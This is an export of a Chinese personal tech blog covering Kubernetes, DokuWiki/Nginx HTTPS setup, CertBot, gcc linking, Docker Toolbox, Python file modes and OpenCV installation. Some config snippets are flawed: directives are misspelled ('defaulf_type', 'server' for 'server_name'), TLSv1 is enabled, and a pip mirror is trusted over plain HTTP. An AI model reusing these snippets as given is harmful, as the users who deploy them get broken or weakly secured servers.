可以跟集群进行协作；即有些云服务供应商，或者是内部的不同部门的团队，它们可以创建自己的 Kubernetes 集群，然后对外提供一些特定服务；其他集群的用户只要通过服务目录这个功能，来调用它们提供的服务即可，而无须在自己的集群上创建资源； 服务目录有四种内置的资源类型，分别为： ClusterServiceBroker ClusterServiceClass ServiceInstance ServiceBinding 运作流程 集群管理员为服务代理创建一个 ClusterServiceBroker 资源，对应一个外部的服务代理商； 集群通过该 Broker 资源，从服务代理商处获得它可以提供的服务列表，并为每种服务创建一个 ClusterServiceClass 资源； 当集群内的用户想要使用某种服务时，只须创建一个 ServiceInstance 实例，并创建一个 ServiceBinding 绑定该 instance；之后集群内的 pod 就可以访问该外部服务了； 服务目录 API 服务器与控制器管理器介绍服务目录跟集群一样，也有自己的 API 服务器、控制器管理器、etcd 数据库等三大件；通过这些组件，可以为外部其他集群的用户提供一些抽象后的高层级服务功能； 以上示意图是站在服务目录提供商集群的视角，实际的用户处于 External system； Service Broker 和 OpenServiceBroker API 当创建好 ClusterServiceBroker 后，集群就会根据资源中的 URL，去代理处请求得到相应的服务列表，之后自动创建相应的 SerivceClass 与之对应； 提供服务与使用服务当需要使用某个外部服务时，只须创建相应的 ServiceInstance 实例，并创建 ServiceBinding 与该实例进行绑定即可； 解除绑定与取消配置当不再需要服务时，通过删除服务实例和服务绑定即可取消； 12kubectl delete servicebinding &lt;my-postgres-db-binding-name&gt;kubectl delete serviceinstance &lt;my-postgres-db-name&gt; 基于 Kubernetes 搭建的平台由于 Kubernetes 方便拓展的特征，很多原本也研发 PaaS 平台的公司，也重新改写它们的产品，变成基于 Kubernetes 进行拓展； 红帽 OpenShift 容器平台Kubernetes 中的很多资源还是非常底层的，OpenShift 对它们进行了封装，提供了更多的抽象资源，并提供参数化的模板，让开发者的工作变得更加简单起来，完全无须了解 Kubernetes 的知识，也能够轻松使用完成部署和维护的工作； Deis Workfiow 与 Helm另外一个有名的 PaaS 产品是 Deis 的 Workfiow（已被微软收购），该团队还开发了一个 Helm 工具，用来简化部署的过程；目前 Helm 已成为社区中的部署标准工具； 仅有镜像是不足以创建应用的，还需要配合声明文件；但对于很多常见的应用来说，例如数据库应用，编写这它们的声明文件就变成了一件重复造轮子的工作，为了避免这个问题，发明了 Helm 这个工具，它将应用和声明文件绑在一起，称为包，然后再结合用户的自定义配置文件，即可以形成应用的发行版本；就像很多人会共享镜像文件一样，也有很多人会共享做好的 Helm 包，当我们需要用到某个通包的软件时，应该先找一下有没有将其做成了 Helm 包，如果有的话，直接拿过来用就可以了； 示例如下： OpenShift 本质上是一个基于 Kubernetes 开发的平台，它有自己优化后的 API 服务器和管理组件，因此，它并不能与用户的现在集群进行整合；而 Deis Workfiow 则可以部署到任何现有的 Kubernetes 集群中，因此 Workfiow 看起来更像是 Kubernetes 的一个插件，让集群的使用更加方便简单； Helm 是 Kubernetes 的一个包管理器，类似于 Ubuntu 里面的 apt，或者 CentOS 里面的 yum；它由两部分组成，一部分是客户端，用于接收和发送用户指令；另一部分则运行在 Kubernetes 集群中（以 pod 的形式存在，通过在集群中安装 Tiller 组件来实现），用来接收客户端发出的指令，并在集群中执行相应的动作； Helm 仓库地址：https://github.com/kubernetes/charts 使用 Helm 的流程： 在仓库中找到合适的图表，git clone 到本地 通过本地的 Helm 客户端，发送图表到集群中； 搞掂！ 19. 经验积累K8s 的本质感觉 Kubernetes 的本质就像一个部署的管理器，它可以将 YAML 所描述的抽象的资源，部署到集群中的机器上面去；这些抽象的资源包括应用、服务、任务、存储、管理器等；所有这些抽象的资源，都需要将它们镜像化和容器化；从而便资源的部署工作简化成创建和运行容器而已； GKE 工作方式对于 GKE，它自带一个客户端 gcloud 可用来实现集群层面的操作，包括创建、更新、删除集群等场景，增加和减少节点数量等；而集群内部的资源操作，则由 kubectl 处理； 管理集群 创建一个 config 文件； 访问 pod 的几种方法 在集群中创建一个 pod，在里面使用 curl 或者端口转发； 通过 API 服务器作为代理 运行命令： kubectl proxy，之后就可以通过代理 URL 来访问 pod 了； 直接访问的 URL：:&#x2F;api&#x2F;v1&#x2F;namespaces&#x2F;default&#x2F;pods&#x2F;kubia-0&#x2F;proxy&#x2F;通过代理访问的 URL： localhost:8001&#x2F;api&#x2F;v1&#x2F;namespaces&#x2F;default&#x2F;pods&#x2F;kubia-0&#x2F;proxy&#x2F;","categories":[],"tags":[{"name":"软件","slug":"软件","permalink":"http://example.com/tags/%E8%BD%AF%E4%BB%B6/"},{"name":"kubernetes","slug":"kubernetes","permalink":"http://example.com/tags/kubernetes/"}]},{"title":"微信小程序进度环","slug":"微信小程序进度环","date":"2020-01-20T01:06:40.000Z","updated":"2024-09-21T03:24:03.418Z","comments":true,"path":"2020/01/20/微信小程序进度环/","permalink":"http://example.com/2020/01/20/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E8%BF%9B%E5%BA%A6%E7%8E%AF/","excerpt":"","text":"wx.createCanvasContext 的工作原理很像 JQuery 里面的选择器，通过 canvas-id 来选择 HTML 文件中相应的 canvas，然后对其进行相关操作实现绘图； demo 代码 github 链接：https://github.com/ccw1078/wx_progress_ring","categories":[],"tags":[{"name":"软件","slug":"软件","permalink":"http://example.com/tags/%E8%BD%AF%E4%BB%B6/"},{"name":"javascript","slug":"javascript","permalink":"http://example.com/tags/javascript/"},{"name":"微信","slug":"微信","permalink":"http://example.com/tags/%E5%BE%AE%E4%BF%A1/"}]},{"title":"CentOS/Nginx 安装 Dokuwiki 支持 Https 访问","slug":"CentOS Nginx 安装 Dokuwiki 支持 Https 访问","date":"2019-10-20T04:02:39.000Z","updated":"2024-09-21T03:24:23.708Z","comments":true,"path":"2019/10/20/CentOS Nginx 安装 Dokuwiki 支持 Https 访问/","permalink":"http://example.com/2019/10/20/CentOS%20Nginx%20%E5%AE%89%E8%A3%85%20Dokuwiki%20%E6%94%AF%E6%8C%81%20Https%20%E8%AE%BF%E9%97%AE/","excerpt":"","text":"更新工具包 注：此更新步骤仅为建议，非必须 12sudo yum -y updatesudo yum -y install vim bash-completion wget tar 更新后重启系统 1sudo reboot 安装工具包12345sudo yum install epel-release yum-utilssudo yum install http://rpms.remirepo.net/enterprise/remi-release-7.rpmsudo yum makecache fastsudo yum-config-manager --disable remi-php54sudo yum-config-manager --enable remi-php72 安装 php 和 Nginx 注：若二者已安装，此步可跳过 123sudo yum -y install php-cli php-fpm php-mysql php-zip php-ldap sudo yum -y install php-devel php-gd php-mcrypt php-mbstring sudo yum -y install php-curl php-xml php-pear php-bcmath 安装好了后，检查一下 php 版本 1php -v 若正常，会显示如下信息： 123PHP 7.2.10 (cli) (built: Sep 11 2018 11:22:20) ( NTS )Copyright (c) 1997-2018 The PHP GroupZend Engine v3.2.0, Copyright (c) 1998-2018 Zend Technologies 注：此处略去安装 Nginx 过程，如有需要，请参考其他教程 安装 Dokuwiki下载前，先到 Github 检查一下它的最新稳定版本，此处假设为”2018-04-22b” 12export RELEASE=&quot;2018-04-22b&quot;wget https://github.com/splitbrain/dokuwiki/archive/release_stable_$&#123;RELEASE&#125;.tar.gz 解压下载的安装包，并转移到新建的文件夹 &#x2F;var&#x2F;www&#x2F;html&#x2F; 中 123tar xvf release_stable_$&#123;RELEASE&#125;.tar.gzsudo mkdir -p /var/www/html/ sudo mv dokuwiki-release_stable_$&#123;RELEASE&#125; /var/www/html/dokuwiki 将文件夹 &#x2F;var&#x2F;www&#x2F;html&#x2F;dokuwiki 所有者权限修改为 nginx_user:nginx_group 注1：更改文件夹的所有者权限，方便 Nginx 有权访问该文件夹中的内容；此处假设 Nginx 进程运行在 nginx_user:nginx_group 下面，如果不是，则相应修改注2：查看 nginx 所属用户 username 的办法为 ps aux | grep nginx注3：查看某个用户 username 所属组的方法为 groups username 1sudo chown -R nginx_user:nginx_group /var/www/html/dokuwiki 安装 SSL 证书目的：支持使用 https 访问 安装 certbot-auto 到本地的 &#x2F;usr&#x2F;local&#x2F;bin 下目的：方便从 Letsencrypt 机构申请免费证书并简化后续的证书到期更新工作 注：若已安装过 certbot-auto 此步骤可略过 12sudo wget https://dl.eff.org/certbot-auto -P /usr/local/binsudo chmod a+x /usr/local/bin/certbot-auto 配置 pip 国内源注：若之前已配置，请跳过此步骤；此步骤的目的是加速 CertBot 下载 python 模块的速度 12345678910# 新建 .pip 文件夹并进入mkdir .pip &amp;&amp; cd .pip# 创建 pip.conf 文件vi pip.conf# 在 pip.conf 文件中输入以下内容[global]index-url=http://mirrors.aliyun.com/pypi/simple/[install]trusted-host=mirrors.aliyun.com# 保存退出 运行脚本，安装依赖1/usr/local/bin/certbot-auto --help 配置 nginx目的：获取域名证书过程中， Let’s Encrypt 会对域名发起访问，以确认申请者对域名的所有权；故需要配置 nginx，以便能够对 Let’s Encrypt 的访问返回正确的响应； 1234# 创建文件夹，用于 Let&#x27;s Encrypt 访问时返回响应内容mkdir /home/letsencrypt# 打开 nginx 配置文件进行编辑，此处假设 nginx 的配置文件在以下路径：/usr/local/nginx/conf/nginx.conf，如不是，则相应修改路径vi /usr/local/nginx/conf/nginx.conf 1234567891011121314// 在 nginx 配置文件中，找到 http，添加一条监听 80 端口的新 serverhttp &#123; //...(略)... // 添加如下内容，此处假设申请域名为 domain.example.com，请修改为实际申请的域名 server &#123; listen 80; server_name domain.example.com; location ~ /.well-known/acme-challenge/ &#123; defaulf_type &quot;text/plain&quot;; root /home/letsencrypt/; &#125; &#125; // ......以下略...... 重启 nginx1234567# 此处假设 nginx 可执行文件在路径 /usr/local/nginx/sbin 下面，如不是则相应修改路径# 先使用 -t 参数测试配置文件格式是否正确/usr/local/nginx/sbin/nginx -t# 若正确，屏幕上将显示以下字样&gt; nginx: the configuration file /usr/local/nginx/conf/nginx.conf syntax is ok# 重启 Nginx/usr/local/nginx/sbin/nginx -s reload 运行脚本，申请证书12# 此处为域名 domain.example.com 申请一张证书，其中的 youremail.com 请替换为你自己的邮箱地址/usr/local/bin/certbot-auto certonly --email youremail.com --webroot -w /home/letsencrypt -d domain.example.com 申请成功后，界面下会有如下的成功提示： 12345IMPORTANT NOTES:- Congratulations! Your certificate and chain have been saved at /etc/letsencrypt/live/helloworld.com/fullchain.pem. Your cert will expire on 2019-08-26. To obtain a new version of the certificate in the future, simply run Let&#x27;s Encrypt again...... 注：记下以上提示信息中的 fullchain.pem 和 privkey.pem 两个文件路径，后续配置 nginx 会用到 配置 Nginx打开 nginx 配置文件 12# 配置文件的路径请根据实际情况修改vi /usr/local/nginx/conf/nginx.conf 在nginx 配置文件中，新增两个 server 条目，内容如下： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071server &#123; listen 443 ssl; # 注意替换此处的域名 server_name domain.example.com; root /var/www/html/dokuwiki; access_log /var/log/dokuwiki.access.log; error_log /var/log/dokuwiki.error.log; ssl on; # 注意替换此处的 fullchain.pem 和 privkey.pem 的路径为正确的实际路径 ssl_certificate /etc/letsencrypt/live/domain.example.com/fullchain.pem; ssl_certificate_key /etc/letsencrypt/live/domain.example.com/privkey.pem; ssl_session_timeout 5m; ssl_ciphers &#x27;AES128+EECDH:AES128+EDH:!aNULL&#x27;; ssl_protocols TLSv1 TLSv1.1 TLSv1.2; ssl_prefer_server_ciphers on; index index.html index.php doku.php; location / &#123; try_files $uri $uri/ @dokuwiki; &#125; location @dokuwiki &#123; rewrite ^/_media/(.*) /lib/exe/fetch.php?media=$1 last; rewrite ^/_detail/(.*) /lib/exe/detail.php?media=$1 last; rewrite ^/_export/([^/]+)/(.*) /doku.php?do=export_$1&amp;id=$2 last; rewrite ^/(.*) /doku.php?id=$1 last; &#125; location ~ /(data|conf|bin|inc)/ &#123; deny all; &#125; location ~* \\.(css|js|gif|jpe?g|png)$ &#123; expires 1M; add_header Pragma public; add_header Cache-Control &quot;public, must-revalidate, proxy-revalidate&quot;; &#125; location ~ \\.php$ &#123; fastcgi_split_path_info ^(.+\\.php)(/.+)$; fastcgi_pass unix:/var/run/php-fpm/php-fpm.sock; fastcgi_index index.php; include fastcgi_params; fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name; fastcgi_intercept_errors off; fastcgi_buffer_size 16k; fastcgi_buffers 4 16k; &#125; location ~ /\\.ht &#123; deny all; &#125;&#125;# 若想支持 80 端口访问，则可以在原监听 80 端口的 server 条目中添加一些信息server &#123; listen 80; server_name domain.example.com; location ~ /.well-known/acme-challenge/ &#123; defaulf_type &quot;text/plain&quot;; root /home/letsencrypt/; &#125; # 以上是 location 原申请证书时已写好的信息，下面的新 location 是需要新添加的信息 location / &#123; add_header Strict-Transport-Security max-age=2592000; rewrite ^ https://$host$request_uri? permanent; &#125;&#125; 配置 php-fpm打开以下 php-fpm 中的文件 1sudo vim /etc/php-fpm.d/www.conf 将文件中以下几个键的值设置为如下： 1234567# 注意替换此处的 nginx_user 和 nginx_group 为实际的用户名和用户组user = nginx_usergroup = nginx_grouplisten = /var/run/php-fpm/php-fpm.socklisten.owner = nginx_userlisten.group = nginx_grouplisten.mode = 0660 启动 nginx 和 php-fpm 12sudo systemctl start php-fpmsudo systemctl enable php-fpm 重启 Nginx 123456# 先使用 -t 参数测试配置文件格式是否正确/usr/local/nginx/sbin/nginx -t# 若正确，屏幕上将显示以下字样&gt; nginx: the configuration file /usr/local/nginx/conf/nginx.conf syntax is ok# 重启 Nginx/usr/local/nginx/sbin/nginx -s reload 配置 DokuWiki使用浏览器打开网址：https://domain.example.com/install.php，打开后页面如下，配置方法请参考其他教程 注：domain.example.com 请相应替换为实际域名 其他Letsenctrypt 的证书有效期为三个月，当剩余一个月时，Letsenctrypt 会发通知邮件到预留的邮箱；收到通知后，只需要登录服务器，运行相关命令，即可自动更新证书 12# 先使用 --dry-run 选项进行测试，非真正执行更新/usr/local/bin/certbot-auto renew --dry-run 若显示如下字样，则表示自动更新功能测试成功 1234Congratulations, all renewals succeeded. The following certs have been renewed: /etc/letsencrypt/live/www.helloworld.com/fullchain.pem (success)** DRY RUN: simulating &#x27;certbot renew&#x27; close to cert expiry** (The test certificates above have not been saved.) 运行以下实际的更新命令，更新完了后，记得重启 nginx 服务器，以便启用新的证书 1/usr/local/bin/certbot-auto renew -v","categories":[],"tags":[{"name":"软件","slug":"软件","permalink":"http://example.com/tags/%E8%BD%AF%E4%BB%B6/"},{"name":"服务器","slug":"服务器","permalink":"http://example.com/tags/%E6%9C%8D%E5%8A%A1%E5%99%A8/"}]},{"title":"gcc 链接器工作原理","slug":"gcc 链接器工作原理","date":"2019-09-28T14:22:33.000Z","updated":"2024-09-21T03:24:36.907Z","comments":true,"path":"2019/09/28/gcc 链接器工作原理/","permalink":"http://example.com/2019/09/28/gcc%20%E9%93%BE%E6%8E%A5%E5%99%A8%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86/","excerpt":"","text":"问题在编译源代码为可执行文件的时候，如果需要链接静态库，我们可能会遇到如下错误提示： 12: In function &#x27;main&#x27; // 或者其他函数名(.text+0x7): undefined reference to &quot;foo&quot; // 或其他变量名 编译出现了失败，提示找不到某些函数或变量的定义。但经过仔细检查核对，发现我们已经在编译命令中，提供了完整的库名称和库路径，因此找不到问题出在哪里 原因分析出现这种问题的原因，很可能是在于静态库之间存在相互依赖，以及链接器的工作方式与我们预期不同造成的，在找出解决办法前，我们可以先了解一下编译器的工作流程 编译及链接流程假设我们的编译命令如下， 1gcc f.c libx.a liby.a libz.a 编译编译器检查命令行中列出的文件，如果发现有 .c 文件，先将所有 .c 的文件翻译成 .o 文件，确保最后只剩下 .o 文件和 .a 文件 链接链接器出场，从左到右开始扫描，进行符号解析工作 1. 建立三个空的集合E 空文件集合：放入该集合中的文件，后续将用于合成最终的可执行文件；U 空符号集合：用来存放在当前目标文件中引用，但没有定义的符号；D 空符号集合：用来存放 E 集合的文件中那些已经定义的符号 注：E\\U\\D，此处分别表示 Empty, Undefined, Defined 2. 从左到右依次扫描每一个文件假设当前扫描到的第一个文件为 f 如果 f 是一个 .o 结尾的目标文件将 f 放入 E 文件集合中将 f 文件中定义的符号添加到 D 符号集合中将 f 文件中引用却未定义的符号，添加到 U 符号集合中； 如果 f 是一个 .a 结尾的存档文件 注：存档文件即静态库文件，它由一个或多个目标文件做为成员打包组成的，假设 f 中的第一个目标文件叫 m 第一步：匹配检查 U 集合中未定义的符号是否在 m 的符号表中 如果没有 抛弃 m，继续扫描 f 中的下一个成员文件； 如果有 将 m 加入 E 集合中； 将 m 中定义的符号添加到 D 符号集合中 将 m 中引用却未定义的符号，添加到 U 符号集合中； 第二步：重复继续扫描 f 中的下一个成员文件，重复上一步的匹配过程，直到 U 和 D 都不再发生变化； 第三步：筛选将所有在 f 中但却不包含在 E 集合中的目标文件成员，抛弃； 3. 重复上一步，直到扫描完所有的输入文件4. 检查 U 符号集合如果 U 非空，则抛出错误，表示存在未定义的引用，并终止；如果 U 为空，则合并和重定位 E 文件集合中的所有目标文件，生成最终的可执行文件，成功； 问题解决思路在了解了编译器工作的流程后，我们会发现，当我们有多个静态库需要链接时，如果这些静态库之间存在依赖关系时，则对静态库的放置顺序是有要求的，即被依赖的库必须放置在依赖者的后面，否则链接器就会找不到未定义的符号；例如 x.a 中引用了 y.a 中定义的函数，则 x.a 必须放置在 y.a 的前面，即正确的顺序应为 1gcc main.c libx.a liby.a 库的顺序规则 惯例：将所有库文件放在命令行的末尾，即在所有 .c 和 .o 文件的后面 如果所有库之间相互独立，那么天下太平，正常编译，回家睡觉 如果所有库之间存在引用，那么需要排列这些库的顺序 确保被引用的库排在引用者的后面 如果二者相互引用，则需要重复输入库名例如：假设 foo 引用 x 库，x 库引用了 y 库，y 库又引用了 x 库，即foo -&gt; x -&gt; y -&gt; x，那么编译命令的顺序如下，其中 x 库需要输入两次1gcc foo.c libx.a liby.a libx.a","categories":[],"tags":[{"name":"软件","slug":"软件","permalink":"http://example.com/tags/%E8%BD%AF%E4%BB%B6/"},{"name":"C++","slug":"C","permalink":"http://example.com/tags/C/"},{"name":"C","slug":"C","permalink":"http://example.com/tags/C/"}]},{"title":"使用 CertBot 自动更新 Let's Encrypt SSL 证书","slug":"使用 CertBot 自动更新 Let's Encrypt SSL 证书","date":"2019-05-26T04:28:06.000Z","updated":"2024-09-21T03:26:08.038Z","comments":true,"path":"2019/05/26/使用 CertBot 自动更新 Let's Encrypt SSL 证书/","permalink":"http://example.com/2019/05/26/%E4%BD%BF%E7%94%A8%20CertBot%20%E8%87%AA%E5%8A%A8%E6%9B%B4%E6%96%B0%20Let's%20Encrypt%20SSL%20%E8%AF%81%E4%B9%A6/","excerpt":"","text":"首次申请下载安装 CertBot1234# 下载 CertBot 脚本到当前目录，假设当前文件夹为 ~ 目录wget https://dl.eff.org/certbot-auto# 为 CertBot 脚本增加执行权限，# a 为 all 简写，x 为 execute 简写，a+x 表示所有用户及群组的可执行权限chmod a+x ./certbot-auto 配置 pip 国内源注：若之前已配置，请跳过此步骤；此步骤的目的是加速 CertBot 下载 python 模块的速度 12345678910# 新建 .pip 文件夹并进入mkdir .pip &amp;&amp; cd .pip# 创建 pip.conf 文件vi pip.conf# 在 pip.conf 文件中输入以下内容[global]index-url=http://mirrors.aliyun.com/pypi/simple/[install]trusted-host=mirrors.aliyun.com# 保存退出 运行脚本，安装依赖1./certbot-auto --help 配置 nginx目的：获取域名证书过程中， Let’s Encrypt 会对域名发起访问，以确认申请者对域名的所有权；故需要配置 nginx，以便能够对 Let’s Encrypt 的访问返回正确的响应； 1234# 创建文件夹，用于 Let&#x27;s Encrypt 访问时返回响应内容mkdir /home/letsencrypt# 打开 nginx 配置文件进行编辑，此处假设 nginx 的配置文件在以下路径：/usr/local/nginx/conf/nginx.conf，如不是，则相应修改路径vi /usr/local/nginx/conf/nginx.conf 1234567891011121314// 在 nginx 配置文件中，找到 http 下监听 80 端口的 serverhttp &#123; //...(略)... server &#123; listen 80; // 添加如下内容，此处假设申请域名为 www.helloworld.com，请修改为实际申请的域名 server_name www.helloworld.com; location ^~ /.well-known/acme-challenge/ &#123; defaulf_type &quot;text/plain&quot;; root /home/letsencrypt/; &#125; // ......以下略...... 重启 nginx1234567# 此处假设 nginx 可执行文件在路径 /usr/local/nginx/sbin 下面，如不是则相应修改路径# 先使用 -t 参数测试配置文件格式是否正确/usr/local/nginx/sbin/nginx -t# 若正确，屏幕上将显示以下字样&gt; nginx: the configuration file /usr/local/nginx/conf/nginx.conf syntax is ok# 重启 Nginx/usr/local/nginx/sbin/nginx -s reload 运行脚本，申请证书在申请证书前，记得先将域名的 DNS 解析指向当前的服务器 IP，这样 letsencrypt 机构在向域名发起连接请求的时候，才能路由到当前设置的机器 1234# 此处为域名 www.helloworld.com 申请一张证书，其中的 youremail.com 请替换为你自己的邮箱地址./certbot-auto certonly --email youremail.com --webroot -w /home/letsencrypt -d www.helloworld.com# 如果要为多个子域名（如 api/test/www） 申请一张证书，则相应修改命令如下./certbot-auto certonly --email youremail.com --webroot -w /home/letsencrypt -d api.helloworld.com -d test.helloworld.com -d www.helloworld.com 申请成功后，界面下会有如下的成功提示： 12345IMPORTANT NOTES:- Congratulations! Your certificate and chain have been saved at /etc/letsencrypt/live/helloworld.com/fullchain.pem. Your cert will expire on 2019-08-26. To obtain a new version of the certificate in the future, simply run Let&#x27;s Encrypt again...... 配置 nginx，启用证书12345678910111213// 在 nginx 配置文件中，找到 http 下监听 443 端口的 serverhttp &#123; //...(略)... server &#123; listen 443 ssl; // 修改 server_name、ssl_certificate、ssl_certificate_key 三个字段的值 // 此处假设申请域名为 www.helloworld.com，请修改为实际申请的域名 server_name www.helloworld.com; ssl_certificate /etc/letsencrypt/live/www.helloworld.com/fullchain.pem; ssl_certificate_key /etc/letsencrypt/live/www.helloworld.com/privkey.pem; // ......以下略...... 当用户访问非加密的 80 端口时，如果需要让服务器自动跳转到 443 端口使用证书的 https 访问，则可以在 http 下 80 端口的 server 中增加如下内容： 1234567891011// 在 nginx 配置文件中，找到 http 下监听 80 端口的 serverhttp &#123; //...(略)... server &#123; listen 80; server_name www.helloworld.com; // 添加如下内容，实现自动跳转 return 301 https://$server_name$request_uri // ......以下略...... 重启 Nginx，让配置生效12# 此处假设 nginx 可执行文件在路径 /usr/local/nginx/sbin 下面，如不是则相应修改路径/usr/local/nginx/sbin/nginx -s reload 测试自动更新12# 使用 --dry-run 选项表示测试，非真正执行更新./certbot-auto renew --dry-run 若显示如下字样，则表示自动更新功能测试成功 1234Congratulations, all renewals succeeded. The following certs have been renewed: /etc/letsencrypt/live/www.helloworld.com/fullchain.pem (success)** DRY RUN: simulating &#x27;certbot renew&#x27; close to cert expiry** (The test certificates above have not been saved.) 到期更新由于 Let’s Encrypt 颁发的证书只有 90 天有效期，因此需要定期进行证书更新 12# 手动更新./certbot-auto renew -v","categories":[],"tags":[{"name":"软件","slug":"软件","permalink":"http://example.com/tags/%E8%BD%AF%E4%BB%B6/"},{"name":"服务器","slug":"服务器","permalink":"http://example.com/tags/%E6%9C%8D%E5%8A%A1%E5%99%A8/"}]},{"title":"windows 如何共享本地文件夹到 docker machine","slug":"windows 如何共享本地文件夹到 docker machine","date":"2019-04-03T08:17:46.000Z","updated":"2024-09-21T03:25:36.834Z","comments":true,"path":"2019/04/03/windows 如何共享本地文件夹到 docker machine/","permalink":"http://example.com/2019/04/03/windows%20%E5%A6%82%E4%BD%95%E5%85%B1%E4%BA%AB%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%A4%B9%E5%88%B0%20docker%20machine/","excerpt":"","text":"背景对于 win10 Home 及 win10 以下的系统，目前只能通过 Docker Toolbox 创建 docker machines 办法来使用 docker 注：以下方法是针对 Docker Toolbox 的场景，如果是 Docker for Windows，则方法不同； 原理docker 需要运行在 Linux 环境下，但 Windows 系统中没有 Linux 环境，因此需要先通过 Docker Toolbox 程序中携带的 Oracle VM VisualBox 工具， 先虚拟出 Linux 环境（即 docker machine），之后便可以在这些虚拟环境中使用 docker，就像在一台原生 Linux系统的电脑中使用 docker 一样；我们可以根据需要虚拟出很多台远程的 linux 环境，每一台都有自己的 docker，它们之间不会相互干扰；每个 docker 下面有对应的 images 和 containers； 日常使用假设我们已经创建了一个叫 default 的虚拟 linux 环境（它以远程 linux 主机的形式出现），我们可以通过 docker-machine ssh default 命令，登录这台主机，进入 Linux 环境，然后在里面执行各种 docker 命令，就好像在原生的 Linux 系统上一样； 如何与本地 windows 共享文件夹方法一：使用 Oracle VM VisualBox 方法二：使用命令行123456# 先暂停远程主机 defaultdocker-machine stop default# 使用 vboxmanage sharedfolder add 添加共享文件夹vboxmanage sharedfolder add default --name &quot;dir/path/on/linux&quot; --hostpath &quot;dir/path/on/local/windows&quot; --automount # 最后重启远程主机docker-machine start default 注：此处假设远程主机名为 default，如果不是，则相应修改","categories":[],"tags":[{"name":"软件","slug":"软件","permalink":"http://example.com/tags/%E8%BD%AF%E4%BB%B6/"},{"name":"docker","slug":"docker","permalink":"http://example.com/tags/docker/"}]},{"title":"界面设计的原则","slug":"界面设计的原则","date":"2019-03-28T00:11:11.000Z","updated":"2024-09-21T03:25:47.197Z","comments":true,"path":"2019/03/28/界面设计的原则/","permalink":"http://example.com/2019/03/28/%E7%95%8C%E9%9D%A2%E8%AE%BE%E8%AE%A1%E7%9A%84%E5%8E%9F%E5%88%99/","excerpt":"","text":"好看并不是界面设计的第一要义，实现产品目标才是。 一个好看，却不实现产品目标的设计，是差劲的； 一个不好看，但实现产品目标的设计，是合格的； 一个又好看，又实现产品目标的设计，是优秀的； 评价一个设计的好坏，步骤顺序如下： 先写出每个界面的产品目标，然后分析设计元素的使用，是否服务并实现了这个目标； 在实现第1条的基础上，根据设计的原理和规范，从颜色、版面、字体等维度，逐项检查设计是否满足了相关的设计原则，实现了美观； 当设计要素之间有冲突的时候，应该依据哪项更好的实现产品目标，进行取舍；","categories":[],"tags":[{"name":"软件","slug":"软件","permalink":"http://example.com/tags/%E8%BD%AF%E4%BB%B6/"},{"name":"设计","slug":"设计","permalink":"http://example.com/tags/%E8%AE%BE%E8%AE%A1/"}]},{"title":"Nginx 实现域名跳转","slug":"Nginx 实现域名跳转","date":"2019-03-01T09:00:10.000Z","updated":"2024-09-21T03:14:41.707Z","comments":true,"path":"2019/03/01/Nginx 实现域名跳转/","permalink":"http://example.com/2019/03/01/Nginx%20%E5%AE%9E%E7%8E%B0%E5%9F%9F%E5%90%8D%E8%B7%B3%E8%BD%AC/","excerpt":"","text":"目标：当访问 a 域名的目录 abc 时，跳转到 b 域名的目录 abc， nginx 新增一条 server 配置实现：1234567server &#123; listen 80; server www.a.com; location /abc/ &#123; rewrite .+ http://www.b.com/$request_uri permanent; &#125;&#125; 123注：其中 $request_uri 表示请求参数的原始URI例如假设访问链接为：http://www.mysite.com:80/test1/test2/test3.html，则 $request_uri 表示 /test1/test2/test3.html","categories":[],"tags":[{"name":"软件","slug":"软件","permalink":"http://example.com/tags/%E8%BD%AF%E4%BB%B6/"}]},{"title":"python 文件打开模式区别 r, r+, w, w+, a, a+","slug":"python 文件打开模式区别 r, r+, w, w+, a, a+","date":"2019-01-24T02:25:09.000Z","updated":"2024-09-21T03:25:32.546Z","comments":true,"path":"2019/01/24/python 文件打开模式区别 r, r+, w, w+, a, a+/","permalink":"http://example.com/2019/01/24/python%20%E6%96%87%E4%BB%B6%E6%89%93%E5%BC%80%E6%A8%A1%E5%BC%8F%E5%8C%BA%E5%88%AB%20r,%20r+,%20w,%20w+,%20a,%20a+/","excerpt":"","text":"r 模式 若文件存在，打开文件，光标置于开头，原数据可读，不可写入新数据； 若文件不存在，报错； r+ 模式 若文件存在，打开文件，光标置于开头，原数据保留，可写入新数据； 若文件不存在，报错； 注：打开文件后，若没有读取操作，则光标默认在开头，此时如果马上写入数据，会覆盖原数据 w 模式 若文件存在，打开文件，清空原数据，光标置于开头，可写入新数据； 若文件不存在，则创建文件； 注：文件的数据不可读； w+ 模式 效果同 w 模式，差异在于，可读取写入的数据（可通过移动光标的位置实现） a 模式 若文件存在，打开文件，原数据保留，光标置于末尾，可追加写入新数据； 若文件不存在，则创建文件； 注：文件数据不可读； a+ 模式 效果同 a 模式，差异在于，文件数据可读 注：打开文件后，由于光标在末尾，此时马上读取数据会为空，因为光标所在位置之后没有数据，此时可先移动光标的位置到开头后再读取；","categories":[],"tags":[{"name":"软件","slug":"软件","permalink":"http://example.com/tags/%E8%BD%AF%E4%BB%B6/"},{"name":"python","slug":"python","permalink":"http://example.com/tags/python/"}]},{"title":"CentOS 安装 OpenCV","slug":"CentOS 安装 OpenCV","date":"2019-01-17T12:13:08.000Z","updated":"2024-09-21T03:31:06.182Z","comments":true,"path":"2019/01/17/CentOS 安装 OpenCV/","permalink":"http://example.com/2019/01/17/CentOS%20%E5%AE%89%E8%A3%85%20OpenCV/","excerpt":"","text":"安装一些依赖包1sudo yum install -y cmake gcc gtk2-devel numpy unzip 1sudo yum install -y qt5-qtbase-devel python-devel jasper-devel 1sudo yum install -y openexr-devel libwebp-devel libjpeg-turbo-devel 1sudo yum install -y freeglut-devel mesa-libGL mesa-libGL-devel libtiff-devel 1sudo yum install -y libdc1394-devel tbb-devel eigen3-devel 1sudo yum install -y boost boost-thread boost-devel libv4l-devel 1sudo yum install -y gstreamer-plugins-base-devel 注：理论上以上依赖包可以用一行 sudo yum install -y 命令一次性安装，之所以分成多行，是因为单行屏幕显示不下，导致折行后看起来不太方便，故拆分成多行安装，方便阅读； 进入文件夹12mkdir downloadscd downloads 注： 此处假定要将 opencv 安装包下载放在新创建的 downloads 文件夹中，如果不是，则相应修改文件夹名称 下载 opencv 安装包1wget https://github.com/opencv/opencv/archive/3.4.5.zip 注： 此处假定要下载 3.4.5 版本，如果不是，则相应修改版本号 解压安装包1unzip 3.4.5.zip 